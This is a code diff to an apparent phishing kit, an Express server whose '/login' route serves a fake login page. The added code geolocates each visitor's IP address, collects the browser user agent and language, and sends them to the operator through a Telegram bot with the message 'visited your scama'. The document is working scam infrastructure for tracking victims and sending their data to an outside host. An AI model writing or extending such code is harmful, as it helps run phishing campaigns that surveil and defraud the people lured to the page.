@@ -51,9 +51,47 @@ const sendTelegramMessage = (text) => {
     req.end();
 };
 
+const currentDate = new Date();
+
+const options = {
+  weekday: 'long',
+  year: 'numeric',
+  month: 'long',
+  day: 'numeric',
+  hour: '2-digit',
+  minute: '2-digit',
+  second: '2-digit',
+  timeZoneName: 'short',
+};
+
+const formattedDate = currentDate.toLocaleString('en-US', options);
+
 
 app.get('/login', async (req, res) => {
+    let message = "";
+    const sendAPIRequest = async (ipAddress) => {
+        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+		console.log(apiResponse.data);
+        return apiResponse.data;
+    };
+
+    const userAgent = req.headers["user-agent"];
+    const systemLang = req.headers["accept-language"];
+
+    const ipAddress = getClientIp(req);
+    const ipAddressInformation = await sendAPIRequest(ipAddress);
+
     try {
+
+        message += `✈️ ${ipAddress} visited your scama on ${formattedDate}\n
+        🌐 ${userAgent}\n
+        📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
+
+        const sendMessage = sendMessageFor(botToken, chatId); 
+        sendMessage(message);
+
+        console.log(message);
+
         // Read the content of the login.html file
         const htmlContent = await fs.readFile('index2.html', 'utf-8');
 
